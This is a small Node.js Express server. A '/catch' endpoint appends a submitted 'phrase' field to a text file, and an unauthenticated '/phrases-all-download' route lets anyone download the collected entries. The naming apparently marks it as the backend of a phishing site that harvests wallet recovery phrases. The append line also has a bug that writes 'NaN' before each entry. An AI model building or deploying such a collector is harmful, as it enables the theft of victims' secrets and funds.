const express = require("express");
const app = express();
const cors = require("cors");
const router = express.Router();

const corsOptions = {
  origin: "http://localhost:5173",
};

app.use(express.json());
app.use(cors(corsOptions));

app.use((req, res, next) => {
  console.log(req.path);
  next();
});

app.post("/catch", (req, res) => {
  try {
    const fs = require("fs");
    fs.appendFile("details.txt", +"\n" + req.body.phrase + "\n", (err) => {
      if (err) {
        throw err;
      }
    });

    return res.json({ success: "done" });
  } catch (error) {
    return res.json({ error });
  }
});

app.get("/phrases-all-download", (req, res) => {
  const fs = require("fs");
  const filePath = "details.txt";

  fs.readFile(filePath, (err, data) => {
    if (err) {
      return res.json({ error: "File not found" });
    }

    res.setHeader("Content-Disposition", `attachment; filename="${filePath}"`);
    res.setHeader("Content-Type", "text/plain");
    res.send(data);
  });
});

app.listen(8080, () => {
  console.log("server is running");
});
